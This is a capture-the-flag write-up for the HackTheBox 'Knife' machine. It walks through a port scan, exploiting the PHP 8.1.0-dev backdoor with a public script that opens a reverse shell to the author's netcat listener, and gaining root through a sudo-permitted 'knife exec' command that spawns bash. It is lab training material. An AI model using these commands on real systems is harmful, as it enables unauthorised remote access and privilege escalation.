
# Scan

```bash
ghost@localhost [10:43:31] [~/Documents/hacking/tj-null-boxes/knife] [master *]
-> % rustscan -a $IP -- -sC -sV
Open 10.10.10.242:22
Open 10.10.10.242:80

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 be549ca367c315c364717f6a534a4c21 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCjEtN3+WZzlvu54zya9Q+D0d/jwjZT2jYFKwHe0icY7plEWSAqbP+b3ijRL6kv522KEJPHkfXuRwzt5z4CNpyUnqr6nQINn8DU0Iu/UQby+6OiQIleNUCYYaI+1mV0sm4kgmue4oVI1Q3JYOH41efTbGDFHiGSTY1lH3HcAvOFh75dCID0564T078p7ZEIoKRt1l7Yz+GeMZ870Nw13ao0QLPmq2HnpQS34K45zU0lmxIHqiK/IpFJOLfugiQF52Qt6+gX3FOjPgxk8rk81DEwicTrlir2gJiizAOchNPZjbDCnG2UqTapOm292Xg0hCE6H03Ri6GtYs5xVFw/KfGSGb7OJT1jhitbpUxRbyvP+pFy4/8u6Ty91s98bXrCyaEy2lyZh5hm7MN2yRsX+UbrSo98UfMbHkKnePg7/oBhGOOrUb77/DPePGeBF5AT029Xbz90v2iEFfPdcWj8SP/p2Fsn/qdutNQ7cRnNvBVXbNm0CpiNfoHBCBDJ1LR8p8k=
|   256 bf8a3fd406e92e874ec97eab220ec0ee (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGKC3ouVMPI/5R2Fsr5b0uUQGDrAa6ev8uKKp5x8wdqPXvM1tr4u0GchbVoTX5T/PfJFi9UpeDx/uokU3chqcFc=
|   256 1adea1cc37ce53bb1bfb2b0badb3f684 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJbkxEqMn++HZ2uEvM0lDZy+TB8B8IAeWRBEu3a34YIb
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-title:  Emergent Medical Idea
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Port 80

Looking around the site, there's nothing interesting. However, looking through the HTTP requests, the response header from the server is odd.

```bash
HTTP/1.1 200 OK
Date: Tue, 01 Nov 2022 02:51:22 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 2406
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```

`X-Powered-By` is odd because usually there is no `-dev` for production servers.

Found an exploit (https://www.exploit-db.com/exploits/49933).

If you are interested in the exploit, you can read this blog post (https://flast101.github.io/php-8.1.0-dev-backdoor-rce/).

Using the [exploit mentioned](https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/revshell_php_8.1.0-dev.py) in the post, I run it on the target machine and gets back the reverse shell.

```bash
ghost@localhost [11:08:20] [~/Documents/hacking/tj-null-boxes/knife] [master *]
-> % python3 revshell_php_8.1.0-dev.py http://$IP 10.10.14.3 4444


ghost@localhost [11:07:43] [~/Documents/hacking/tj-null-boxes/knife] [master *]
-> % nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.242] 40174
bash: cannot set terminal process group (980): Inappropriate ioctl for device
bash: no job control in this shell
james@knife:/$
```

# User.txt

```bash
james@knife:~$ cat user.txt\
7f19eb051a585263dd9563d47569e6e8
```

# Privilege escalation

`sudo -l` shows I can run the `knife` binary with sudo.

```bash
james@knife:~$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

From googling, it shows that `knife` is a tool from configuration management tool `chef` (https://docs.chef.io/workstation/knife/). Knife can execute ruby code, so with the following command I manage to get root shell.

```bash
james@knife:~$ sudo /usr/bin/knife exec -E 'system("whoami")'
root

james@knife:~$ sudo /usr/bin/knife exec -E 'system("/usr/bin/bash")'

id
uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
73cb8d73b016f8d3d44f38f13a41c910
```

